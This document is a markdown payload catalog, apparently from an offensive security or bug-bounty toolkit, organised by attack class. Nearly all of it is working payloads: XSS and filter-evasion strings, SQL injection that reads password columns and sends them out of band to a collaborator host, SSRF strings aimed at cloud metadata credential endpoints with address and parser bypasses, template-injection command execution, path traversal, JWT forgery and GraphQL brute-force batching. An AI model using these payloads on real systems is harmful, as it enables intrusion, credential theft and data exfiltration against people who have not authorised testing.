# Payloads Index

Curated payload catalog organized by attack class. This catalog is always
available, with zero dependencies. Each payload
includes encoding variants and detection mechanisms.

Expand with operator discoveries.

---

## XSS (Cross-Site Scripting)

### Reflected XSS — HTML Context

- `<script>alert(document.domain)</script>` — base probe, confirms execution
- `"><script>alert(1)</script>` — break out of HTML attribute
- `</script><script>alert(1)</script>` — break out of script block
- `'-alert(1)-'` — single-quote context (event handlers)
- `` `-alert(1)-` `` — template literal / ES6 context
- `javascript:alert(1)` — href/src attribute context
- Source: OWASP XSS Filter Evasion Cheat Sheet

### Stored XSS

- `<img src=x onerror=alert(1)>` — survives HTML entity encoding in some frameworks
- `<svg/onload=alert(1)>` — SVG context, often less filtered
- `<<script>script>alert(1)<</script>/script>` — double-tag filter evasion
- `<details open ontoggle=alert(1)>` — no script tag needed
- `<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>` — mXSS via namespace confusion
- Source: PortSwigger XSS Cheat Sheet, mXSS research (Mario Heiderich)

### DOM XSS

- `#<img src=x onerror=alert(1)>` — hash-based DOM XSS in SPA routing
- `#javascript:alert(1)` — location.hash sink
- `"><svg/onload=eval(location.hash.slice(1))>` — hash-based payload delivery
- `postMessage` sinks: check for `addEventListener('message', ...)` without origin check
- Source: DOM XSS Wiki, PortSwigger Web Security Academy

### WAF/Filter Evasion

- `<ScRiPt>alert(1)</ScRiPt>` — case variation
- `<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">` — HTML entity encoded
- `<img src=x onerror=eval(atob('YWxlcnQoMSk='))>` — base64-encoded payload
- `<img src=x onerror=alert(String.fromCharCode(49))>` — char code obfuscation
- Source: OWASP XSS Filter Evasion Cheat Sheet

---

## SQL Injection

### Detection Probes

- `'` — single quote (observe error/behavior change)
- `"` — double quote
- `\'` — escaped quote (MySQL)
- `1' OR '1'='1` — boolean-based probe
- `1' AND '1'='1` — true condition (compare to false)
- `1' AND '1'='2` — false condition (baseline)
- Source: PortSwigger SQL Injection Cheat Sheet

### Union-Based

- `' UNION SELECT NULL--` — column count probe (add NULLs until no error)
- `' UNION SELECT username,password FROM users--` — data extraction
- `' UNION SELECT @@version,database()--` — DB fingerprint
- `' UNION SELECT table_name,NULL FROM information_schema.tables--` — schema enumeration
- Source: OWASP SQL Injection

### Blind — Boolean-Based

- `' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a` — character-by-character extraction
- `' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)=1` — conditional response
- Source: PortSwigger Web Security Academy

### Blind — Time-Based

- `'; IF (1=1) WAITFOR DELAY '0:0:5'--` — MSSQL
- `' OR SLEEP(5)--` — MySQL
- `' OR pg_sleep(5)--` — PostgreSQL
- `' OR (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--` — conditional timing
- Source: PortSwigger SQL Injection Cheat Sheet

### Out-of-Band

- `'; DECLARE @c VARCHAR(8000); SET @c=(SELECT password FROM users); EXEC('master..xp_dirtree "\\'+@c+'.collaborator.example.com\\x"')--` — MSSQL OOB
- `' OR LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.collaborator.example.com\\x'))--` — MySQL OOB (Windows)
- Source: PortSwigger Web Security Academy

---

## SSRF (Server-Side Request Forgery)

**Score by the response channel, not by the request.** A fired request is the floor of this class.
Full ladders live in the dedicated wordlists; this section is the quick index.

- `wordlists/ssrf-address-forms.txt` — alternate representations of loopback and link-local
- `wordlists/ssrf-parser-confusion.txt` — URL grammar attacks against split-decision validators
- `wordlists/ssrf-internal-services.txt` — port sweep + per-service chain catalogue
- `nimbus/wordlists/cloud-metadata-endpoints.txt` — 60+ provider endpoints with header requirements
- Skill: `specter/.claude/skills/ssrf/SKILL.md` — see also hunting Rule 32

### Basic Probes

- `http://169.254.169.254/latest/meta-data/` — AWS IMDS, header-free (IMDSv1)
- `http://169.254.170.2/v2/credentials/` — AWS ECS/Fargate task role, header-free
- `http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json` — GCP, header-free legacy path, JSON forced for renderer channels
- `http://100.100.100.200/latest/meta-data/` — Alibaba
- `http://192.0.0.192/latest/meta-data/` — Oracle Cloud legacy
- `http://169.254.169.254/metadata/v1.json` — DigitalOcean, header-free, one-shot
- `http://127.0.0.1:8080/admin` — localhost service probe
- `http://[::1]:8080/` — IPv6 loopback
- `http://[::]:22/` — IPv6 unspecified, reaches loopback services on many stacks
- Source: OWASP SSRF Cheat Sheet, provider documentation

### URL Scheme Attacks

- `file:///etc/passwd` — local file read
- `file:///proc/self/environ` — process env; recovers container credential URIs
- `gopher://127.0.0.1:6379/_INFO` — Redis, non-destructive proof
- `dict://127.0.0.1:11211/stats` — memcached probe
- `dict://127.0.0.1:6379/info` — Redis via dict
- `ldap://127.0.0.1:389/%0astats%0aquit` — LDAP with CRLF injection
- `netdoc:///etc/passwd` — legacy JRE alias for file://
- `jar:http://attacker.example.com/evil.zip!/x` — fetch-and-unzip on Java stacks
- Source: SSRF Bible (Wallarm), PayloadsAllTheThings

### Address-Form Bypasses

- `http://2130706433/` — dotless decimal, 127.0.0.1
- `http://0177.0.0.1/` — dotted octal
- `http://0x7f.0x0.0x0.0x1/` — dotted hexadecimal
- `http://127.1/` — short-form loopback
- `http://[::ffff:a9fe:a9fe]/` — IPv4-mapped IPv6 for the metadata address
- `http://[0:0:0:0:0:ffff:169.254.169.254]/` — expanded mapped form
- `http://[fd00:ec2::254]/` — AWS IPv6 metadata endpoint
- `http://[64:ff9b:1::a9fe:a9fe]/` — NAT64 local-use prefix; missed by several filter libraries
- `http://metadata.google.internal./` — trailing dot defeats string-compare deny lists
- `http://425.510.425.510/` — dotted-decimal overflow wraps to the metadata address
- Source: PayloadsAllTheThings, `wordlists/ssrf-address-forms.txt`

### Parser-Confusion Bypasses

- `http://allowed.example.com@169.254.169.254/` — userinfo splitting
- `http://allowed.example.com:80@169.254.169.254/` — userinfo with a port
- `http://169.254.169.254/?x=allowed.example.com` — defeats substring-anywhere validators
- `http://169.254.169.254#allowed.example.com` — fragment confusion
- `http://allowed.example.com%0d%0aHost:%20169.254.169.254%0d%0a` — CRLF Host smuggling
- `httpAAAA...://169.254.169.254/` — over-long scheme; some parsers treat the URL as relative
- Redirect statuses to test **individually**: 301, 302, 303, 307, 308. A client that "does not
  follow redirects" often follows exactly one of them; 307/308 preserve method and body.
- Source: URL parser inconsistency research (Black Hat USA 2017), `wordlists/ssrf-parser-confusion.txt`

### No-URL-Parameter Variants

- `X-Forwarded-Host: attacker.example.com` — a server-rendered framework rebuilding its own
  absolute base URL from the request will dial the host you supply. Also `Host`,
  `X-Original-Host`, `X-Host`, `X-Forwarded-Server`, `Forwarded: host=`. One at a time.
- A duplicated `Host` header, and an absolute-URI request line whose host disagrees with `Host`.
- Behind a CDN the same forgery may poison a cache entry served to other users, which is a
  materially worse impact than a self-only fetch.
- `http://[fe80::1%25eth0]/` — IPv6 zone identifier; defeats bracketed-host regexes that do not
  model the `%zone` grammar. Send `%` raw and percent-encoded.
- Source: `wordlists/ssrf-address-forms.txt`, playbook `ssrf-host-header-framework`

### Cloud Metadata Endpoints

- AWS IMDSv1: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
- AWS IMDSv2: `PUT /latest/api/token` + `X-aws-ec2-metadata-token-ttl-seconds`, then
  `X-aws-ec2-metadata-token` on the GET. Not a wall for a primitive that can set a method and a header.
- AWS ECS/Fargate: `http://169.254.170.2/v2/credentials/<UUID>`
- AWS Lambda: `http://127.0.0.1:9001/2018-06-01/runtime/invocation/next`
- GCP: `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token` (`Metadata-Flavor: Google`)
- Azure: `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=...` (`Metadata: true`)
- Oracle: `http://169.254.169.254/opc/v2/instance/` (`Authorization: Bearer Oracle`)
- Kubernetes etcd: `http://127.0.0.1:2379/v2/keys/?recursive=true`
- Docker: `http://127.0.0.1:2375/v1.24/containers/json`
- Source: `nimbus/wordlists/cloud-metadata-endpoints.txt`

---

## SSTI (Server-Side Template Injection)

### Detection Polyglots

- `${{<%[%'"}}%\.` — universal polyglot (covers 7+ template engines)
- `{{7*7}}` — Jinja2/Twig/Django (should render 49)
- `#{7*7}` — Pug/Jade
- `<%= 7*7 %>` — ERB/EJS
- `${{7*7}}` — Freemarker/Velocity
- Source: PortSwigger SSTI Research (James Kettle)

### Jinja2 / Flask

- `{{config}}` — Flask config dump
- `{{''.__class__.__mro__[1].__subclasses__()}}` — class enumeration
- `{{''.__class__.__mro__[2].__subclasses__()[X]('ls', shell=True, stdout=-1).communicate()}}` — RCE via subprocess.Popen
- Source: PayloadsAllTheThings (SSTI)

### Freemarker / Java

- `${7*7}` — basic probe
- `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` — RCE
- Source: PayloadsAllTheThings

### Velocity / Java

- `#set($x='')$x.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('id')` — RCE
- Source: PayloadsAllTheThings

---

## Path Traversal / LFI

### Basic Probes

- `../../../etc/passwd` — basic traversal
- `....//....//....//etc/passwd` — path normalization bypass
- `..%2F..%2F..%2Fetc%2Fpasswd` — URL-encoded
- `..%252F..%252F..%252Fetc%252Fpasswd` — double-encoded
- Source: OWASP Path Traversal

### Bypass Stripping

- `....//....//....//etc/passwd` — normalize after strip
- `..\/..\/..\/etc/passwd` — backslash on Windows
- `../../../etc/passwd%00.html` — null byte (legacy PHP)
- Source: PortSwigger Web Security Academy

### Wrapper / Scheme Abuse (PHP)

- `php://filter/convert.base64-encode/resource=index.php` — base64 source disclosure
- `php://filter/read=convert.base64-encode/resource=../../../etc/passwd` — chained with traversal
- `phar://uploaded-file.zip/shell.php` — phar deserialization
- `expect://id` — expect wrapper (if enabled)
- Source: PayloadsAllTheThings (LFI)

---

## JWT Attacks

### Algorithm Confusion

- Change `alg` from `RS256` to `HS256`, sign with the public key
- `alg: "none"` — remove signature entirely
- Source: PortSwigger JWT Attack research

### Claim Tampering

- `{"sub": "victim"}` → `{"sub": "admin"}`
- `{"role": "user"}` → `{"role": "admin"}`
- `{"exp": 9999999999}` — extend expiry
- `{"iss": "attacker"}` — issuer confusion
- Source: OWASP JWT Cheat Sheet

### Secret Cracking

- `hashcat -m 16500 jwt.txt wordlist.txt` — HMAC-SHA256
- `john jwt.txt --wordlist=wordlist.txt` — John the Ripper
- Common secrets: `secret`, `key`, `password`, app name, repo name
- Source: jwt_tool, hashcat documentation

---

## SSP (Server-Side Parameter Pollution)

### Query String Pollution

- `?id=1&id=2` — duplicate parameters (different parsers take first vs last)
- `?id=1%26id=2` — URL-encoded &
- `?id=1%23fragment` — fragment injection
- `?id=1%3Fnewparam=test` — query injection
- Source: OWASP API Security Top 10, PortSwigger

### REST Path Pollution

- `/api/users/123%2F..%2Fadmin` — path traversal in REST URL
- `/api/users/..;/admin` — matrix parameter bypass (Java/JAX-RS)
- `/api/users/123;admin=true/orders` — matrix param injection
- `/api/users/%2e%2e%2fadmin` — URL-encoded traversal
- Source: PortSwigger Web Security Academy

### Structured Data Pollution

- `{"id": 1, "id": 2}` — duplicate JSON keys
- `{"id": 1, "role": "admin"}` — mass assignment probe
- `{"id": {"$gt": ""}}` — NoSQL injection probe
- `<user><id>1</id><id>2</id></user>` — duplicate XML elements
- Source: OWASP API Security

---

## GraphQL Attacks

### Introspection

- `{__schema{types{name,fields{name}}}}` — full schema dump
- `{__type(name:"User"){fields{name,type{name,fields{name}}}}}` — type introspection
- Source: OWASP GraphQL Cheat Sheet

### Injection via Arguments

- `{user(id:"1' OR '1'='1"){name}}` — SQLi via GraphQL argument
- `{user(id:"../../../etc/passwd"){name}}` — path traversal via argument
- Source: PayloadsAllTheThings (GraphQL)

### Batching / Brute-Force

- Batched queries to bypass rate limiting:
```graphql
{ a: login(user:"admin",pass:"pass1") { token } b: login(user:"admin",pass:"pass2") { token } }
```
- Source: OWASP GraphQL Cheat Sheet

---

## Note

This catalog is a starting point — always cross-reference with the latest OWASP
cheat sheets, PortSwigger research, and your own writeup collection. Add new payloads as you discover techniques
that work in the field.
